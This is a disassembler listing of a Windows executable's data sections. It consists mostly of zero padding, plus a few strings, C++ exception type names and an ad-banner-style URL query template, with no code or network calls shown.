                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  74h ; t
                db  79h ; y
                db  70h ; p
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  70h ; p
                db  61h ; a
                db  67h ; g
                db  65h ; e
                db  69h ; i
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  70h ; p
                db  73h ; s
                db  69h ; i
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  66h ; f
                db  6Fh ; o
                db  72h ; r
                db  6Dh ; m
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  67h ; g
                db  75h ; u
                db  69h ; i
                db  64h ; d
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  6Ch ; l
                db  69h ; i
                db  73h ; s
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  61h ; a
                db  3Dh ; =
                db  31h ; 1
                db  33h ; 3
                db  31h ; 1
                db  37h ; 7
                db  26h ; &
                db  62h ; b
                db  3Dh ; =
                db  31h ; 1
                db  30h ; 0
                db  30h ; 0
                db  34h ; 4
                db  33h ; 3
                db  26h ; &
                db  74h ; t
                db  79h ; y
                db  70h ; p
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  75h ; u
                db  73h ; s
                db  65h ; e
                db  72h ; r
                db  3Dh ; =
                db  68h ; h
                db  6Fh ; o
                db  6Dh ; m
                db  65h ; e
                db  5Fh ; _
                db  70h ; p
                db  61h ; a
                db  67h ; g
                db  65h ; e
                db  7Ch ; |
                db  68h ; h
                db  6Fh ; o
                db  6Dh ; m
                db  65h ; e
                db  70h ; p
                db  61h ; a
                db  67h ; g
                db  65h ; e
                db  5Fh ; _
                db  32h ; 2
                db  6Eh ; n
                db  64h ; d
                db  5Fh ; _
                db  62h ; b
                db  61h ; a
                db  6Eh ; n
                db  6Eh ; n
                db  65h ; e
                db  72h ; r
                db  5Fh ; _
                db  38h ; 8
                db  32h ; 2
                db  30h ; 0
                db  78h ; x
                db  39h ; 9
                db  30h ; 0
                db  26h ; &
                db  70h ; p
                db  61h ; a
                db  67h ; g
                db  65h ; e
                db  69h ; i
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  62h ; b
                db  6Fh ; o
                db  72h ; r
                db  64h ; d
                db  65h ; e
                db  72h ; r
                db  3Dh ; =
                db  30h ; 0
                db  26h ; &
                db  6Ch ; l
                db  6Fh ; o
                db  63h ; c
                db  61h ; a
                db  6Ch ; l
                db  3Dh ; =
                db  79h ; y
                db  65h ; e
                db  73h ; s
                db  26h ; &
                db  70h ; p
                db  73h ; s
                db  69h ; i
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  66h ; f
                db  3Dh ; =
                db  31h ; 1
                db  26h ; &
                db  66h ; f
                db  6Fh ; o
                db  72h ; r
                db  6Dh ; m
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  68h ; h
                db  3Dh ; =
                db  26h ; &
                db  69h ; i
                db  3Dh ; =
                db  31h ; 1
                db  30h ; 0
                db  30h ; 0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
dword_42AA10    dd 0Fh                  ; DATA XREF: sub_401AE0+104↑w
                                        ; sub_401AE0+16A↑r ...
off_42AA14      dd offset off_4202D8    ; DATA XREF: .rdata:004228E4↑o
                                        ; .rdata:off_422A9C↑o ...
                db    0
                db    0
                db    0
                db    0
                db  2Eh ; .
                db  3Fh ; ?
                db  41h ; A
                db  56h ; V
                db  65h ; e
                db  78h ; x
                db  63h ; c
                db  65h ; e
                db  70h ; p
                db  74h ; t
                db  69h ; i
                db  6Fh ; o
                db  6Eh ; n
                db  40h ; @
                db  73h ; s
                db  74h ; t
                db  64h ; d
                db  40h ; @
                db  40h ; @
                db    0
off_42AA30      dd offset off_4202D8    ; DATA XREF: .rdata:0042298C↑o
                                        ; .rdata:off_4229B4↑o ...
                align 8
aAvoutOfRangeSt db '.?AVout_of_range@std@@',0
                align 10h
off_42AA50      dd offset off_4202D8    ; DATA XREF: .rdata:00422A2C↑o
                                        ; .rdata:off_422A50↑o ...
                align 8
aAvlogicErrorSt db '.?AVlogic_error@std@@',0
                align 10h
off_42AA70      dd offset off_4202D8    ; DATA XREF: .rdata:004229DC↑o
                                        ; .rdata:off_422A04↑o ...
                align 8
aAvlengthErrorS db '.?AVlength_error@std@@',0
                align 10h
off_42AA90      dd offset off_4202D8    ; DATA XREF: .rdata:00422A78↑o
                                        ; .rdata:off_422AD0↑o ...
                align 8
aAvbadAllocStd  db '.?AVbad_alloc@std@@',0
                align 20h
dword_42AAC0    dd 0                    ; DATA XREF: sub_40EB1D+8↑w
                                        ; sub_40EC54+5↑r
dword_42AAC4    dd 0                    ; DATA XREF: sub_40F94F+2D↑o
                                        ; .text:loc_41F32C↑w ...
                align 10h
dword_42AAD0    dd 0                    ; DATA XREF: sub_40F94F:loc_40F975↑r
                                        ; sub_40F94F+34↑w
; LPVOID dword_42AAD4
dword_42AAD4    dd 0                    ; DATA XREF: start-AD↑w
                                        ; sub_41763E+F↑r ...
                db    0
                db    0
                db    0
                db    0
dword_42AADC    dd 0                    ; DATA XREF: sub_410117+5↑r
                                        ; sub_41C7C8+19↑r ...
dword_42AAE0    dd 0                    ; DATA XREF: sub_4107C6+91↑w
                                        ; .rdata:ExceptionInfo↑o
dword_42AAE4    dd 0                    ; DATA XREF: sub_4107C6+9B↑w
                db    0
                db    0
                db    0
                db    0
dword_42AAEC    dd 0                    ; DATA XREF: sub_4107C6+8C↑w
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
dword_42AB30    dd 0                    ; DATA XREF: sub_4107C6+C1↑w
                                        ; sub_4107C6+E1↑r
                align 8
dword_42AB38    dd 0                    ; DATA XREF: sub_4107C6+7D↑w
                                        ; .rdata:ExceptionInfo↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
word_42ABC4     dw 0                    ; DATA XREF: sub_4107C6+51↑w
                align 4
word_42ABC8     dw 0                    ; DATA XREF: sub_4107C6+4A↑w
                align 4
word_42ABCC     dw 0                    ; DATA XREF: sub_4107C6+43↑w
                align 10h
word_42ABD0     dw 0                    ; DATA XREF: sub_4107C6+3C↑w
                align 4
dword_42ABD4    dd 0                    ; DATA XREF: sub_4107C6+28↑w
dword_42ABD8    dd 0                    ; DATA XREF: sub_4107C6+22↑w
dword_42ABDC    dd 0                    ; DATA XREF: sub_4107C6+1C↑w
dword_42ABE0    dd 0                    ; DATA XREF: sub_4107C6+16↑w
dword_42ABE4    dd 0                    ; DATA XREF: sub_4107C6+10↑w
dword_42ABE8    dd 0                    ; DATA XREF: sub_4107C6+B↑w
dword_42ABEC    dd 0                    ; DATA XREF: sub_4107C6+62↑w
dword_42ABF0    dd 0                    ; DATA XREF: sub_4107C6+6A↑w
                                        ; sub_4107C6+87↑r
word_42ABF4     dw 0                    ; DATA XREF: sub_4107C6+35↑w
                align 4
dword_42ABF8    dd 0                    ; DATA XREF: sub_4107C6+59↑w
dword_42ABFC    dd 0                    ; DATA XREF: sub_4107C6+72↑w
word_42AC00     dw ?                    ; DATA XREF: sub_4107C6+2E↑w
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
dword_42AE04    dd ?                    ; DATA XREF: sub_4119C3+14↑w
                                        ; sub_4119C3+1F↑w ...
word_42AE08     dw ?                    ; DATA XREF: sub_411C24+E7↑w
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
dword_42AE14    dd ?                    ; DATA XREF: sub_411C24+C3↑w
dword_42AE18    dd ?                    ; DATA XREF: sub_411C24+CB↑w
dword_42AE1C    dd ?                    ; DATA XREF: sub_411C24+D3↑w
dword_42AE20    dd ?                    ; DATA XREF: sub_40E5DA+8↑r
                                        ; sub_40EDBB+5↑r ...
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
dword_42AE44    dd ?                    ; DATA XREF: sub_4125BC+39↑w
                                        ; sub_4125BC+5A↑r ...
; LPVOID lpTlsValue
lpTlsValue      dd ?                    ; DATA XREF: sub_412217+15↑r
                                        ; sub_4125BC+46↑w ...
dword_42AE4C    dd ?                    ; DATA XREF: sub_41224B+B↑r
                                        ; sub_41238C+3A↑r ...
dword_42AE50    dd ?                    ; DATA XREF: sub_412268+B↑r
                                        ; sub_4125BC+67↑w ...
dword_42AE54    dd ?                    ; DATA XREF: sub_412BB3+18↑r
                                        ; sub_412BB3+2D↑r ...
dword_42AE58    dd ?                    ; DATA XREF: sub_419E86+18F↑r
dword_42AE5C    dd ?                    ; DATA XREF: start-62↑r
                                        ; sub_4178B6+A4↑w
dword_42AE60    dd ?                    ; DATA XREF: start-68↑r
                                        ; sub_4178B6+A9↑w
                align 8
; LPVOID dword_42AE68
dword_42AE68    dd ?                    ; DATA XREF: start:loc_41021F↑r
                                        ; sub_41763E+47↑w ...
dword_42AE6C    dd ?                    ; DATA XREF: start-6E↑w
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
dword_42AE78    dd ?                    ; DATA XREF: sub_4178B6+37↑w
                align 10h
byte_42AE80     db ?                    ; DATA XREF: sub_412EA9+30↑w
                                        ; sub_413651+5↑r
                align 4
dword_42AE84    dd ?                    ; DATA XREF: sub_412EA9+27↑w
dword_42AE88    dd ?                    ; DATA XREF: sub_412EA9+1B↑r
                                        ; sub_412EA9+FE↑w
dword_42AE8C    dd ?                    ; DATA XREF: sub_41374F+2A7↑w
